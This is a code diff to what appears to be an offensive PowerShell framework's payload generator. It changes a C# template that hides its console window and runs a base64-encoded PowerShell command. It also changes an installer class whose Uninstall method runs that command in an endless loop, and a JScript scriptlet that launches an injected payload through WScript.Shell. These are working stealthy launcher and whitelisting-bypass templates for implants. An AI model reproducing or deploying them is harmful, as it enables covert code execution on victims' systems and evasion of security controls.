@@ -260,74 +260,79 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 
 public class Program
-	{
-        [DllImport( "user32.dll" )]
-        public static extern bool ShowWindow( IntPtr hWnd, int nCmdShow );
-        public const int SW_SHOWMINIMIZED = 2;
-		public static string InvokeAutomation(string cmd)
-		{
-		    Runspace newrunspace = RunspaceFactory.CreateRunspace();
-		    newrunspace.Open();
-		    RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
-		    Pipeline pipeline = newrunspace.CreatePipeline();
+    {
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-		    pipeline.Commands.AddScript(cmd);
-		    Collection<PSObject> results = pipeline.Invoke();
-		    newrunspace.Close();
+        public const int SW_HIDE = 0;
+        public const int SW_SHOW = 5;
 
-		    StringBuilder stringBuilder = new StringBuilder();
-		    foreach (PSObject obj in results)
-		    {
-		        stringBuilder.Append(obj);
-		    }
-		    return stringBuilder.ToString().Trim();
-		}
-		public static void Main()
-		{
-            IntPtr winHandle = System.Diagnostics.Process.GetCurrentProcess().MainWindowHandle;
-            ShowWindow( winHandle, SW_SHOWMINIMIZED );
-	        try
-	        {
-	            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
-	            InvokeAutomation(tt);
-	        }
-	        catch
-	        {
-	            Console.WriteLine("Error running encoded command, ensure the command is unicode base64!");
-	        }
-		}
-		
+        public static string InvokeAutomation(string cmd)
+        {
+            Runspace newrunspace = RunspaceFactory.CreateRunspace();
+            newrunspace.Open();
+            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+            Pipeline pipeline = newrunspace.CreatePipeline();
+
+            pipeline.Commands.AddScript(cmd);
+            Collection<PSObject> results = pipeline.Invoke();
+            newrunspace.Close();
+
+            StringBuilder stringBuilder = new StringBuilder();
+            foreach (PSObject obj in results)
+            {
+                stringBuilder.Append(obj);
+            }
+            return stringBuilder.ToString().Trim();
+        }
+        public static void Main()
+        {
+            var handle = GetConsoleWindow();
+            ShowWindow(handle, SW_HIDE);
+            try
+            {
+                string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+                InvokeAutomation(tt);
+            }
+            catch
+            {
+                Console.WriteLine("Error running encoded command, ensure the command is unicode base64!");
+            }
+        }
+        
 }
-	
+    
 [System.ComponentModel.RunInstaller(true)]
 public class Sample : System.Configuration.Install.Installer
 {
     public override void Uninstall(System.Collections.IDictionary savedState)
     {
-		while(true)
-		{
-	        string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
-	        InvokeAutomation(tt);			
-		}
+        while(true)
+        {
+            string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
+            InvokeAutomation(tt);           
+        }
     }
-	public static string InvokeAutomation(string cmd)
-	{
-	    Runspace newrunspace = RunspaceFactory.CreateRunspace();
-	    newrunspace.Open();
-	    RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
-	    Pipeline pipeline = newrunspace.CreatePipeline();
+    public static string InvokeAutomation(string cmd)
+    {
+        Runspace newrunspace = RunspaceFactory.CreateRunspace();
+        newrunspace.Open();
+        RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
+        Pipeline pipeline = newrunspace.CreatePipeline();
 
-	    pipeline.Commands.AddScript(cmd);
-	    Collection<PSObject> results = pipeline.Invoke();
-	    newrunspace.Close();
+        pipeline.Commands.AddScript(cmd);
+        Collection<PSObject> results = pipeline.Invoke();
+        newrunspace.Close();
 
-	    StringBuilder stringBuilder = new StringBuilder();
-	    foreach (PSObject obj in results)
-	    {
-	        stringBuilder.Append(obj);
-	    }
-	    return stringBuilder.ToString().Trim();
-	}
+        StringBuilder stringBuilder = new StringBuilder();
+        foreach (PSObject obj in results)
+        {
+            stringBuilder.Append(obj);
+        }
+        return stringBuilder.ToString().Trim();
+    }
 }'
 [IO.File]::WriteAllLines("$global:newdir\posh.cs", $csccode)
 
@@ -769,12 +774,12 @@ while ($listener.IsListening)
     progid="Bandit"
     version="1.00"
     classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
-	>	
-	<script language="JScript">
-		<![CDATA[
-		var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");
-		]]>
-	</script>
+    >   
+    <script language="JScript">
+        <![CDATA[
+        var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");
+        ]]>
+    </script>
 </registration>
 
 <public>
@@ -782,12 +787,12 @@ while ($listener.IsListening)
 </public>
 <script language="JScript">
 <![CDATA[
-	
-	function Exec()
-	{
-		var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");
-	}
-	
+    
+    function Exec()
+    {
+        var r = new ActiveXObject("WScript.Shell").Run("'+$payload+'");
+    }
+    
 ]]>
 </script>
 
